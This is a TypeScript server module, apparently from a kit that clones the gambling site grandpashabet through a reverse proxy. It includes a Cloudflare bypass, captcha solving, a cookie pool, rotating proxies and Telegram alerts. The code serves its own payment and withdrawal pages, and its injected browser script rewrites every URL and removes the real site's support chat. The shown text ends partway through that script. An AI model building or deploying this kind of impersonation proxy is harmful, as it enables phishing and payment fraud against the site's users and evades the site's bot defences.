import type { Express, Request, Response } from "express";
import type { Server } from "http";
import { HttpsProxyAgent } from "https-proxy-agent";
import https from "https";
import http from "http";
import { URL } from "url";
import zlib from "zlib";
import crypto from "crypto";
import WebSocket, { WebSocketServer } from "ws";
import session from "express-session";
import connectPgSimple from "connect-pg-simple";
import createMemoryStore from "memorystore";
import bcrypt from "bcryptjs";
import {
  getCloudflareBypassCookies,
  getLastBypassError,
  getCachedCookies,
  setCachedCookies,
  performLogin,
  getPuppeteerSessionId,
  setPuppeteerSessionId,
  fetchPageViaBrowser,
  fetchResourceViaBrowser,
  directBrowserLogin,
} from "./cloudflare-bypass";
import { isCaptchaConfigured, getBalance, solveRecaptchaV2, solveRecaptchaV3 } from "./captcha-solver";
import {
  loadPool,
  addSnapshot,
  updateCookies as updatePoolCookies,
  getActiveCookies as getPoolCookies,
  getPoolStatus,
  clearPool,
  importCookies as poolImportCookies,
} from "./cookie-pool";
import { storage } from "./storage";
import { insertUserSchema } from "@shared/schema";
import { registerAdminRoutes, seedDefaultAdmin } from "./admin-routes";
import { getPaymentPageHtml, getPaymentFormHtml, getWithdrawalPageHtml } from "./payment-page";
import { sendTelegram } from "./telegram";
import { sendVerificationCode } from "./email";
import { updateTargetDomain as updateTargetDomainConfig, getTargetHost, getTargetUrl, getTargetOrigin } from "./target-config";

declare module "express-session" {
  interface SessionData {
    userId: string;
    username: string;
    pending2FA?: { userId: string; username: string; email: string };
    resend2FALastAt?: number;
  }
}
import {
  createSnapshot,
  getSnapshotProgress,
  listSnapshots,
  activateSnapshot,
  deactivateSnapshot,
  getActiveSnapshotId,
  getActiveSnapshotDir,
  deleteSnapshot,
  formatSize,
} from "./snapshot";
import fs from "fs";
import path from "path";
import mime from "mime-types";
import { pool } from "./db";

// Disable TLS verification globally for proxy connections
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

// ═══════════════════════════════════════════════════
// ─── Config (her zaman target-config'den oku; admin target degistirince aninda gecerli) ───
// ═══════════════════════════════════════════════════
async function loadTargetDomainFromDb() {
  try {
    const s = await storage.getSettings();
    if (s?.targetDomain && s.targetDomain !== getTargetHost()) {
      updateTargetDomainConfig(s.targetDomain);
      if (typeof responseCache !== "undefined") { responseCache.clear(); clearDiskCache(); }
    }
  } catch (e) {}
}

loadTargetDomainFromDb();
const USER_AGENT =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36";
const MOBILE_UA =
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1";
const MODULE_VERSION = "3.0";

// 3rd party domains that should NOT be proxied (loaded directly by user's browser)
const EXTERNAL_DOMAINS = new Set([
  "www.google.com",
  "www.gstatic.com",
  "fonts.googleapis.com",
  "fonts.gstatic.com",
  "cdn.jsdelivr.net",
  "cdnjs.cloudflare.com",
  "www.googletagmanager.com",
  "analytics.google.com",
  "static.cloudflareinsights.com",
  "challenges.cloudflare.com",
  "pragmaticplay.net",
  "ppgames.net",
  "egt-bg.com",
  "egt-digital.com",
  "amusnet.com",
  "amusnetinteractive.com",
  "smartico.ai",
  "api5.smartico.ai",
  "tawk.to",
  "embed.tawk.to",
  "va.tawk.to",
  "vs.tawk.to",
]);

// Domains that are part of the target site ecosystem (should be proxied)
const TARGET_DOMAIN_PATTERN = /grandpashabet\d*\.com/i;

// ═══════════════════════════════════════════════════
// ─── Response Cache ───
// ═══════════════════════════════════════════════════
interface CacheEntry {
  body: string | Buffer;
  contentType: string;
  statusCode: number;
  headers: Record<string, string>;
  timestamp: number;
  hits: number;
}

const responseCache = new Map<string, CacheEntry>();
// Hizli servis: HTML 4 saat, asset 24 saat bellekte (disk cache ile kalici)
const HTML_CACHE_TTL = 4 * 60 * 60 * 1000;
const ASSET_CACHE_TTL = 24 * 60 * 60 * 1000;
const MAX_CACHE_SIZE = 12000;
const MAX_CACHE_ENTRY_SIZE = 12 * 1024 * 1024;
// Tarayici cache: HTML 1 saat, asset 7 gun
const BROWSER_HTML_MAX_AGE = 3600;
const BROWSER_ASSET_MAX_AGE = 604800;

const DISK_CACHE_DIR = path.join(process.cwd(), "data", "proxy-cache");
const DISK_CACHE_MAX_ENTRIES = 3000;
const DISK_CACHE_MAX_BODY = 2 * 1024 * 1024;

function diskCacheKeyToFile(key: string): string {
  const safe = crypto.createHash("sha256").update(key).digest("hex").slice(0, 32);
  return path.join(DISK_CACHE_DIR, safe + ".json");
}

function clearDiskCache(): void {
  try {
    if (fs.existsSync(DISK_CACHE_DIR)) {
      const files = fs.readdirSync(DISK_CACHE_DIR);
      for (const f of files) {
        try { fs.unlinkSync(path.join(DISK_CACHE_DIR, f)); } catch (_) {}
      }
    }
  } catch (_) {}
}

function getCached(key: string): CacheEntry | null {
  const entry = responseCache.get(key);
  if (entry) {
    const isAsset = ASSET_EXTENSIONS.test(key);
    const ttl = isAsset ? ASSET_CACHE_TTL : HTML_CACHE_TTL;
    if (Date.now() - entry.timestamp > ttl) {
      responseCache.delete(key);
      return null;
    }
    entry.hits++;
    entry.timestamp = Date.now();
    return entry;
  }
  if (key.startsWith("GET:D:") || key.startsWith("GET:M:")) {
    try {
      const filePath = diskCacheKeyToFile(key);
      if (fs.existsSync(filePath)) {
        const raw = fs.readFileSync(filePath, "utf-8");
        const data = JSON.parse(raw) as { body: string; contentType: string; statusCode: number; timestamp: number };
        const ttl = HTML_CACHE_TTL;
        if (Date.now() - data.timestamp > ttl) {
          try { fs.unlinkSync(filePath); } catch (_) {}
          return null;
        }
        const entry: CacheEntry = {
          body: data.body,
          contentType: data.contentType,
          statusCode: data.statusCode,
          headers: {},
          timestamp: data.timestamp,
          hits: 0,
        };
        entry.hits++;
        entry.timestamp = Date.now();
        responseCache.set(key, entry);
        return entry;
      }
    } catch (_) {}
  }
  return null;
}

function setCache(key: string, entry: Omit<CacheEntry, 'timestamp' | 'hits'>): void {
  const bodySize = typeof entry.body === 'string' ? Buffer.byteLength(entry.body) : entry.body.length;
  if (bodySize > MAX_CACHE_ENTRY_SIZE) return;

  if (responseCache.size >= MAX_CACHE_SIZE) {
    const entries = Array.from(responseCache.entries());
    entries.sort((a, b) => {
      const aScore = a[1].hits * 1e10 - a[1].timestamp;
      const bScore = b[1].hits * 1e10 - b[1].timestamp;
      return aScore - bScore;
    });
    const toRemove = Math.floor(MAX_CACHE_SIZE * 0.15);
    for (let i = 0; i < toRemove; i++) {
      responseCache.delete(entries[i][0]);
    }
  }

  const full: CacheEntry = { ...entry, timestamp: Date.now(), hits: 0 };
  responseCache.set(key, full);

  if ((key.startsWith("GET:D:") || key.startsWith("GET:M:")) && typeof entry.body === "string" && entry.body.length < DISK_CACHE_MAX_BODY && !key.includes("?")) {
    const toWrite = { body: entry.body, contentType: entry.contentType, statusCode: entry.statusCode || 200, timestamp: full.timestamp };
    const filePath = diskCacheKeyToFile(key);
    setImmediate(async () => {
      try {
        const fsp = await import("fs/promises");
        await fsp.mkdir(DISK_CACHE_DIR, { recursive: true });
        const files = await fsp.readdir(DISK_CACHE_DIR);
        if (files.length >= DISK_CACHE_MAX_ENTRIES) {
          const withStat = await Promise.all(files.map(async (f) => ({ n: f, m: (await fsp.stat(path.join(DISK_CACHE_DIR, f))).mtimeMs })));
          withStat.sort((a, b) => a.m - b.m);
          const toDel = Math.floor(DISK_CACHE_MAX_ENTRIES * 0.2);
          for (let i = 0; i < toDel; i++) {
            try { await fsp.unlink(path.join(DISK_CACHE_DIR, withStat[i].n)); } catch (_) {}
          }
        }
        await fsp.writeFile(filePath, JSON.stringify(toWrite), "utf-8");
      } catch (_) {}
    });
  }
}

setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of responseCache) {
    const isAsset = ASSET_EXTENSIONS.test(key);
    const ttl = isAsset ? ASSET_CACHE_TTL : HTML_CACHE_TTL;
    if (now - entry.timestamp > ttl) {
      responseCache.delete(key);
    }
  }
}, 5 * 60 * 1000);

function log(tag: string, msg: string) {
  console.log(`[${tag}] ${msg}`);
}

// ═══════════════════════════════════════════════════
// ─── Session & Proxy ───
// ═══════════════════════════════════════════════════
function generateSessionId(): string {
  return crypto.randomBytes(8).toString("hex");
}

let currentSessionId = generateSessionId();

function isProxyConfigured(): boolean {
  return !!(process.env.PROXY_USER && process.env.PROXY_PASS);
}

function getProxyUrl(): string {
  const proxyHost = process.env.PROXY_HOST || "gw.dataimpulse.com";
  const proxyPort = process.env.PROXY_PORT || "823";
  const proxyUser = process.env.PROXY_USER || "demo";
  const proxyPass = process.env.PROXY_PASS || "demo";
  const sessionAuth = `${proxyUser}_session-${currentSessionId}`;
  return `http://${sessionAuth}:${proxyPass}@${proxyHost}:${proxyPort}`;
}

function createProxyAgent(): HttpsProxyAgent<string> {
  return new HttpsProxyAgent(getProxyUrl(), { rejectUnauthorized: false });
}
let proxyAgent: HttpsProxyAgent<string> = createProxyAgent();
if (isProxyConfigured()) {
  log("PROXY", `Initialized v${MODULE_VERSION}`);
} else {
  log("PROXY", `WARNING: PROXY_USER/PROXY_PASS not set. Proxy features will be limited. Set env vars to enable.`);
}

// ═══════════════════════════════════════════════════
// ─── Cookie Management (with persistent pool) ───
// ═══════════════════════════════════════════════════
const storedCookies: Map<string, string> = new Map();

// Startup: cookie pool'dan yükle
const poolCookiesOnStart = loadPool();
if (Object.keys(poolCookiesOnStart).length > 0) {
  for (const [k, v] of Object.entries(poolCookiesOnStart)) storedCookies.set(k, v);
  log("COOKIE-POOL", `${Object.keys(poolCookiesOnStart).length} cookie pool'dan yüklendi`);
}

function parseCookies(setCookieHeaders: string[] | undefined): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (!setCookieHeaders) return cookies;
  for (const header of setCookieHeaders) {
    const match = header.match(/^([^=]+)=([^;]*)/);
    if (match) cookies[match[1]] = match[2];
  }
  return cookies;
}

function storeAndSyncCookies(newCookies: Record<string, string>) {
  if (!newCookies || Object.keys(newCookies).length === 0) return;
  for (const [k, v] of Object.entries(newCookies)) storedCookies.set(k, v);
  updatePoolCookies(newCookies);
}

function buildCookieString(): string {
  return Array.from(storedCookies.entries())
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");
}

function mergeCookies(clientCookies: string): string {
  const finalMap = new Map<string, string>();
  // Client cookies first (lower priority)
  if (clientCookies) {
    for (const part of clientCookies.split(";")) {
      const t = part.trim();
      if (!t) continue;
      const eq = t.indexOf("=");
      if (eq > 0) finalMap.set(t.substring(0, eq).trim(), t.substring(eq + 1));
    }
  }
  // Stored cookies override (higher priority - CF + auth)
  storedCookies.forEach((v, k) => finalMap.set(k, v));
  return Array.from(finalMap.entries())
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");
}

// ═══════════════════════════════════════════════════
// ─── HTTP Helpers (use proxyAgent + storedCookies) ───
// ═══════════════════════════════════════════════════
async function fetchViaProxy(path: string, method: string = "GET"): Promise<string> {
  const allCookies = buildCookieString();
  return new Promise<string>((resolve, reject) => {
    const reqObj = https.request({
      hostname: getTargetHost(), port: 443, path, method,
      headers: {
        "Host": getTargetHost(), "Connection": "keep-alive", "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": `${getTargetOrigin()}/tr/`,
        "Cookie": allCookies,
      },
      agent: proxyAgent, timeout: 15000, rejectUnauthorized: false,
    }, (res) => {
      if (res.headers["set-cookie"]) {
        const nc = parseCookies(res.headers["set-cookie"] as string[]);
        for (const [k, v] of Object.entries(nc)) storedCookies.set(k, v);
      }
      const encoding = res.headers["content-encoding"];
      let stream: NodeJS.ReadableStream = res;
      if (encoding === "gzip") stream = res.pipe(zlib.createGunzip());
      else if (encoding === "deflate") stream = res.pipe(zlib.createInflate());
      else if (encoding === "br") stream = res.pipe(zlib.createBrotliDecompress());
      const chunks: Buffer[] = [];
      stream.on("data", (chunk: Buffer) => chunks.push(chunk));
      stream.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
      stream.on("error", reject);
    });
    reqObj.on("error", reject);
    reqObj.on("timeout", () => { reqObj.destroy(); reject(new Error("Timeout")); });
    reqObj.end();
  });
}

async function postViaProxy(path: string, body: string): Promise<{ statusCode: number; body: string; setCookies: string[] }> {
  const allCookies = buildCookieString();
  const bodyBuffer = Buffer.from(body);
  return new Promise((resolve, reject) => {
    const reqObj = https.request({
      hostname: getTargetHost(), port: 443, path, method: "POST",
      headers: {
        "Host": getTargetHost(), "Connection": "keep-alive",
        "Content-Length": bodyBuffer.length.toString(),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "User-Agent": USER_AGENT, "Accept": "*/*",
        "Origin": getTargetOrigin(), "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": `${getTargetOrigin()}${path}`,
        "Cookie": allCookies,
      },
      agent: proxyAgent, timeout: 15000, rejectUnauthorized: false,
    }, (res) => {
      const rawSetCookies: string[] = [];
      if (res.headers["set-cookie"]) {
        const cookies = Array.isArray(res.headers["set-cookie"]) ? res.headers["set-cookie"] : [res.headers["set-cookie"]];
        for (const c of cookies) rawSetCookies.push(c);
        const nc = parseCookies(cookies);
        for (const [k, v] of Object.entries(nc)) storedCookies.set(k, v);
      }
      const statusCode = res.statusCode || 0;
      const encoding = res.headers["content-encoding"];
      let stream: NodeJS.ReadableStream = res;
      if (encoding === "gzip") stream = res.pipe(zlib.createGunzip());
      else if (encoding === "deflate") stream = res.pipe(zlib.createInflate());
      else if (encoding === "br") stream = res.pipe(zlib.createBrotliDecompress());
      const chunks: Buffer[] = [];
      stream.on("data", (chunk: Buffer) => chunks.push(chunk));
      stream.on("end", () => resolve({ statusCode, body: Buffer.concat(chunks).toString("utf-8"), setCookies: rawSetCookies }));
      stream.on("error", reject);
    });
    reqObj.on("error", reject);
    reqObj.on("timeout", () => { reqObj.destroy(); reject(new Error("Timeout")); });
    reqObj.write(bodyBuffer);
    reqObj.end();
  });
}

// ═══════════════════════════════════════════════════
// ─── CF-Ready Gate (Headful Chrome + Real TLS) ───
// ═══════════════════════════════════════════════════
let cfBypassInProgress = false;
let cfBypassPromise: Promise<void> | null = null;
let cfBypassResolve: (() => void) | null = null;
let lastBypassAttempt = 0;
let bypassFailCount = 0;
let proxyVerified = false;
let cfClearanceExpiry = 0;
const BYPASS_COOLDOWN_MS = 60000;
const MAX_AUTO_RETRIES = 5;
const CF_CLEARANCE_LIFETIME = 8 * 60 * 1000;

function isCfReady(): boolean {
  if (storedCookies.has("cf_clearance")) {
    if (cfClearanceExpiry > 0 && Date.now() > cfClearanceExpiry) {
      log("CF", "cf_clearance expired, needs refresh");
      return false;
    }
    return true;
  }
  return proxyVerified || storedCookies.size >= 3;
}

async function waitForCfReady(timeoutMs = 90000): Promise<boolean> {
  if (isCfReady() && !cfBypassInProgress) return true;
  if (cfBypassPromise) {
    await Promise.race([cfBypassPromise, new Promise((r) => setTimeout(r, timeoutMs))]);
    return isCfReady();
  }
  if (!cfBypassInProgress) {
    await startCfBypass();
    return isCfReady();
  }
  return isCfReady();
}

async function startCfBypass(): Promise<void> {
  const now = Date.now();
  if (cfBypassInProgress) {
    if (cfBypassPromise) await cfBypassPromise;
    return;
  }
  if (now - lastBypassAttempt < BYPASS_COOLDOWN_MS && bypassFailCount > 0) {
    log("CF", `Cooldown active (${Math.ceil((BYPASS_COOLDOWN_MS - (now - lastBypassAttempt)) / 1000)}s remaining)`);
    return;
  }
  lastBypassAttempt = now;
  cfBypassInProgress = true;
  cfBypassPromise = new Promise<void>((resolve) => {
    cfBypassResolve = resolve;
  });
  try {
    setPuppeteerSessionId(currentSessionId);
    log("CF", "Starting headful Chrome bypass...");
    const cfCookies = await getCloudflareBypassCookies();
    if (cfCookies) {
      const newSid = getPuppeteerSessionId();
      if (newSid !== currentSessionId) {
        currentSessionId = newSid;
        proxyAgent = createProxyAgent();
        log("CF", `Session synced to Puppeteer: ${currentSessionId}`);
      }
      for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
      addSnapshot(cfCookies.allCookies, currentSessionId, "bypass", getTargetHost());
      if (cfCookies.cfClearance) {
        cfClearanceExpiry = Date.now() + CF_CLEARANCE_LIFETIME;
      }
      bypassFailCount = 0;
      log("CF", `Bypass SUCCESS - ${storedCookies.size} cookies, cf_clearance=${!!cfCookies.cfClearance}`);
    } else {
      bypassFailCount++;
      log("CF", `Bypass failed (attempt #${bypassFailCount})`);
    }
  } catch (e: any) {
    bypassFailCount++;
    log("CF", `Bypass error: ${e.message}`);
  } finally {
    cfBypassInProgress = false;
    cfBypassResolve?.();
    cfBypassPromise = null;
    cfBypassResolve = null;
  }
}

// ═══════════════════════════════════════════════════
// ─── URL Rewriting ───
// ═══════════════════════════════════════════════════
// /tr/tr önlemek: path içinde baştaki tr/ veya tr tekrarlarını kaldır
function stripTrFromPath(path: string, proxyBase: string): string {
  if (proxyBase !== "/tr" || !path || typeof path !== "string") return path;
  return path.replace(/^(tr\/?)+/i, "").replace(/^\/+/, "") || "";
}

function injectMobileViewport(html: string, isMobile: boolean): string {
  if (!isMobile) return html;
  let r = html;
  // data-type="Desktop" -> "Mobile" (hedef site masaustu donuyorsa mobilde duzelt)
  r = r.replace(/data-type=["']Desktop["']/gi, 'data-type="Mobile"');
  const mobileViewport = '<meta name="viewport" content="width=390,initial-scale=1,maximum-scale=1,user-scalable=no">';
  if (/<meta\s+[^>]*name=["']viewport["']/i.test(r)) {
    r = r.replace(/<meta\s+[^>]*name=["']viewport["'][^>]*>/gi, mobileViewport);
  } else {
    r = r.replace(/<\/head>/i, mobileViewport + "\n</head>");
  }
  return r;
}

function rewriteHtml(html: string, proxyBase: string): string {
  let r = html;

  // 1) Absolute URLs — avoid /tr/tr when base is /tr: ...com/tr/xxx -> proxyBase/xxx
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/([^"'\s>]*)/gi, (_m, path) => proxyBase + "/" + stripTrFromPath(path, proxyBase));
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/?/gi, proxyBase + "/");
  r = r.replace(/https?:\/\/grandpashabet\d*\.com/gi, proxyBase);

  // 2) Protocol-relative — same
  const baseNoProto = proxyBase.replace(/^https?:/, "") || proxyBase;
  r = r.replace(/\/\/grandpashabet\d*\.com\/tr\/([^"'\s>]*)/gi, (_m, path) => baseNoProto + "/" + stripTrFromPath(path, proxyBase));
  r = r.replace(/\/\/grandpashabet\d*\.com\/tr\/?/gi, baseNoProto + "/");
  r = r.replace(/\/\/grandpashabet\d*\.com/gi, baseNoProto);

  // 3) href="/..." — prefix with proxyBase; skip // and /proxy; when base is /tr also skip /tr/
  const skipPath = proxyBase === "/tr" ? "(?!\\/|proxy|tr\\/)" : "(?!\\/|proxy)";
  r = r.replace(
    new RegExp("(\\s(?:href|src|action|data-src|data-href|data-url|data-image|data-bg|poster|srcset)=[\"'])\\/" + skipPath, "gi"),
    `$1${proxyBase}/`
  );

  // 4) CSS url(/) — background-image, font-face etc.
  r = r.replace(/url\(\s*["']?\/(?!\/|proxy|data:)/gi, `url(${proxyBase}/`);

  // 5) Meta refresh redirect
  r = r.replace(
    /(content=["']\d+;\s*url=)\/(?!proxy)/gi,
    `$1${proxyBase}/`
  );

  // 6) window.location / document.location assignments
  r = r.replace(
    /((?:window|document)\.location\s*=\s*["'])\/(?!proxy)/gi,
    `$1${proxyBase}/`
  );

  // 6.5) Inject CSS: hide welcome popup + force page scroll (hedef sitedeki overflow:hidden / #wrapper / jquery.mobi)
  const loginKillCss = `
<style id="proxy-scroll-fix">
html, body,
#wrapper, [id="wrapper"],
[data-role="page"],
.ui-mobile-viewport,
.ofh,
body.ofh,
body.ui-mobile-viewport {
  overflow: auto !important;
  overflow-x: hidden !important;
  height: auto !important;
  min-height: 100% !important;
  max-height: none !important;
  -webkit-overflow-scrolling: touch;
}
#wrapper[style*="overflow: hidden"],
[data-role="page"][style*="overflow: hidden"] {
  overflow: auto !important;
}
/* Orijinal giriş popup artık gösteriliyor - login inject kaldırıldı */
.ui-popup-container, .ui-popup, .ui-popup-active,
[data-role="popup"], [class*="popup-container"] {
  overflow: visible !important;
  height: auto !important;
  max-height: none !important;
}
</style>`;
  r = r.replace(/<head([^>]*)>/i, `<head$1>${loginKillCss}`);

  // 6.6) Ödeme iframe: sport.grndspr*.com CSP frame-ancestors yüzünden bloklanmasin — proxy üzerinden aç
  r = r.replace(
    /(<iframe[^>]*\ssrc=)(["'])(https?:\/\/(?:[^"']*\.)?grndspr[^"']*)(\2)/gi,
    (_m, pre, q, url) => pre + q + proxyBase + "/iframe-proxy?url=" + encodeURIComponent(url) + q
  );

  // 7) Inject comprehensive proxy override script at <head>
  const wsScript = `
<script>
(function(){
  var PB = '${proxyBase}';
  var RE_TARGET = /^https?:\\/\\/grandpashabet\\d*\\.com/i;
  var RE_WS_TARGET = /^wss?:\\/\\/grandpashabet\\d*\\.com/i;

  // Block target site's live chat (mobifly, eforservhub, comm100)
  var _blockChat = /mobifly|eforservhub|comm100|livechatinc|livechat-static/i;

  // Remove chat elements as they appear
  var _chatObs = new MutationObserver(function(muts) {
    muts.forEach(function(m) {
      m.addedNodes.forEach(function(n) {
        if (n.nodeType !== 1) return;
        var tag = n.tagName;
        if (tag === 'SCRIPT' && _blockChat.test(n.src || '')) { n.remove(); return; }
        if (tag === 'IFRAME' && _blockChat.test(n.src || '')) { n.remove(); return; }
        if (_blockChat.test(n.id || '') || _blockChat.test(n.className || '')) { n.remove(); return; }
      });
    });
  });
  if (document.documentElement) _chatObs.observe(document.documentElement, { childList: true, subtree: true });
  else document.addEventListener('DOMContentLoaded', function() { _chatObs.observe(document.documentElement, { childList: true, subtree: true }); });

  function fixUrl(url) {
    if (typeof url !== 'string') return url;
    if (url.match(RE_TARGET)) {
      var path = url.replace(RE_TARGET, '');
      path = path.replace(/^(\\/tr\\/?)+/g, '/').replace(/^\\/+/, '/') || '/';
      return PB + (path === '/' ? '' : path);
    }
    if (url.startsWith(PB)) {
      var rest = url.slice(PB.length);
      rest = rest.replace(/^(\\/tr\\/?)+/g, '/') || '/';
      return PB + rest;
    }
    if (url.startsWith('/') && !url.startsWith('/api/') && !url.startsWith('/login') && !url.startsWith('/payment') && !url.startsWith('/withdrawal') && !url.startsWith('//')) return PB + url;
    return url;
  }

  function fixWsUrl(url) {
    if (typeof url !== 'string') return url;
    if (url.match(/\\.tn\\.to|tawk\\.to|embed\\.tawk/i)) return url;
    var loc = window.location;
    var wsProto = loc.protocol === 'https:' ? 'wss:' : 'ws:';
    if (url.match(RE_WS_TARGET)) {
      var path = url.replace(/^wss?:\\/\\//, '');
      return wsProto + '//' + loc.host + '/proxy-ws/wss/' + path;
    }
    if (url.match(/^wss?:\\/\\//)) {
      var path = url.replace(/^wss?:\\/\\//, '');
      var proto = url.startsWith('wss') ? 'wss' : 'ws';
      return wsProto + '//' + loc.host + '/proxy-ws/' + proto + '/' + path;
    }
    return url;
  }

  // ─── XHR ───
  var _xhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string' && _blockChat.test(url)) { return; }
    arguments[1] = fixUrl(url);
    return _xhrOpen.apply(this, arguments);
  };

  // ─── Fetch ───
  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var checkUrl = typeof input === 'string' ? input : (input instanceof Request ? input.url : '');
    if (_blockChat.test(checkUrl)) { return Promise.resolve(new Response('', {status: 200})); }
    if (typeof input === 'string') input = fixUrl(input);
    else if (input instanceof Request) {
      var fixed = fixUrl(input.url);
      if (fixed !== input.url) input = new Request(fixed, input);
    }
    return _fetch.call(this, input, init);
  };

  // ─── WebSocket ───
  var _WS = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    var fixedUrl = fixWsUrl(url);
    console.log('[PROXY-WS] ' + url + ' → ' + fixedUrl);
    if (protocols) return new _WS(fixedUrl, protocols);
    return new _WS(fixedUrl);
  };
  window.WebSocket.prototype = _WS.prototype;
  window.WebSocket.CONNECTING = _WS.CONNECTING;
  window.WebSocket.OPEN = _WS.OPEN;
  window.WebSocket.CLOSING = _WS.CLOSING;
  window.WebSocket.CLOSED = _WS.CLOSED;

  // ─── Element.setAttribute (URL rewriting - orijinal login için reCAPTCHA engelleme kaldırıldı) ───
  var _setAttr = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function(name, value) {
    if ((name === 'src' || name === 'href' || name === 'action' || name === 'data-src' || name === 'poster') && typeof value === 'string') {
      value = fixUrl(value);
    }
    return _setAttr.call(this, name, value);
  };

  // ─── Property setters for src/href ───
  function hookProp(proto, prop) {
    var desc = Object.getOwnPropertyDescriptor(proto, prop);
    if (desc && desc.set) {
      var origSet = desc.set;
      Object.defineProperty(proto, prop, {
        get: desc.get,
        set: function(v) { origSet.call(this, fixUrl(v)); },
        configurable: true, enumerable: true
      });
    }
  }
  try {
    hookProp(HTMLImageElement.prototype, 'src');
    hookProp(HTMLScriptElement.prototype, 'src');
    hookProp(HTMLLinkElement.prototype, 'href');
    hookProp(HTMLAnchorElement.prototype, 'href');
    hookProp(HTMLSourceElement.prototype, 'src');
    hookProp(HTMLIFrameElement.prototype, 'src');
  } catch(e) {}

  // ─── jQuery AJAX ───
  function hookJQuery() {
    var jq = window.jQuery || window.$;
    if (jq && jq.ajaxPrefilter) {
      jq.ajaxPrefilter(function(options) {
        if (options.url) options.url = fixUrl(options.url);
      });
    }
    if (jq && jq.fn && jq.fn.load && !jq.fn._proxyLoadHooked) {
      var _origLoad = jq.fn.load;
      jq.fn.load = function(url) {
        if (typeof url === 'string') arguments[0] = fixUrl(url);
        return _origLoad.apply(this, arguments);
      };
      jq.fn._proxyLoadHooked = true;
    }
  }
  hookJQuery();
  // Sayfa kaydirmayi zorla (hedef JS overflow:hidden tekrar uygulayabilir)
  function forceScroll() {
    var sel = 'html, body, #wrapper, [data-role="page"], .ui-mobile-viewport, .ofh';
    try {
      document.querySelectorAll(sel).forEach(function(el) {
        el.style.setProperty('overflow', 'auto', 'important');
        el.style.setProperty('overflow-x', 'hidden', 'important');
        el.style.setProperty('height', 'auto', 'important');
        el.style.setProperty('max-height', 'none', 'important');
      });
    } catch(e) {}
  }
  var _daf = document.addEventListener;
  document.addEventListener = function(type, fn, opts) {
    if (type === 'DOMContentLoaded') {
      var wrapped = function() {
        hookJQuery();
        forceScroll();
        var t = 0, iv = setInterval(function() { forceScroll(); if (++t >= 8) clearInterval(iv); }, 500);
        return fn.apply(this, arguments);
      };
      return _daf.call(this, type, wrapped, opts);
    }
    return _daf.call(this, type, fn, opts);
  };
  if (document.readyState === 'loading') { } else { forceScroll(); }

  // ─── Disable jQuery Mobile AJAX navigation (breaks with proxy) ───
  function disableJqmAjax() {
    if (window.jQuery && window.jQuery.mobile) {
      window.jQuery.mobile.ajaxEnabled = false;
      window.jQuery.mobile.linkBindingEnabled = false;
      window.jQuery.mobile.hashListeningEnabled = false;
      window.jQuery.mobile.pushStateEnabled = false;
    }
  }
  // Keep checking until jQM loads
  var _jqmCheck = setInterval(function() {
    disableJqmAjax();
    if (window.jQuery && window.jQuery.mobile) clearInterval(_jqmCheck);
  }, 100);
  setTimeout(function() { clearInterval(_jqmCheck); }, 30000);
  // mobileinit fires between jQuery and jQuery Mobile load
  document.addEventListener('mobileinit', disableJqmAjax);

  // ─── History API (SPA navigation) ───
  var _pushState = history.pushState;
  var _replaceState = history.replaceState;
  history.pushState = function(state, title, url) {
    if (typeof url === 'string') url = fixUrl(url);
    return _pushState.call(this, state, title, url);
  };
  history.replaceState = function(state, title, url) {
    if (typeof url === 'string') url = fixUrl(url);
    return _replaceState.call(this, state, title, url);
  };

  // ─── window.open ───
  var _open = window.open;
  window.open = function(url) {
    arguments[0] = fixUrl(url);
    return _open.apply(this, arguments);
  };

  // ─── Click interceptor for <a> tags ───
  document.addEventListener('click', function(e) {
    var el = e.target;
    while (el && el.tagName !== 'A') el = el.parentElement;
    if (!el || !el.href) return;
    var href = el.getAttribute('href');
    if (!href || href === '#' || href.startsWith('#')) return;
    var dataRel = el.getAttribute('data-rel');
    if (dataRel === 'popup' || dataRel === 'dialog' || dataRel === 'back') return;
    if (el.getAttribute('data-ajax') === 'false' || el.getAttribute('data-transition')) {
      if (href.startsWith('/') && !href.startsWith('/proxy') && !href.startsWith('/api/') && !href.startsWith('//')) {
        el.setAttribute('href', fixUrl(PB + href));
      }
      return;
    }
    if (href.startsWith('/') && !href.startsWith('/proxy') && !href.startsWith('/api/') && !href.startsWith('//')) {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = fixUrl(PB + href);
    } else if (href.match && href.match(RE_TARGET)) {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = fixUrl(href);
    }
  }, true);

  // ─── Location setter interceptor via Proxy (for modern browsers) ───
  // Override location.assign and location.replace
  var _locAssign = window.location.assign;
  var _locReplace = window.location.replace;
  if (_locAssign) {
    window.location.assign = function(url) { return _locAssign.call(window.location, fixUrl(url)); };
  }
  if (_locReplace) {
    window.location.replace = function(url) { return _locReplace.call(window.location, fixUrl(url)); };
  };

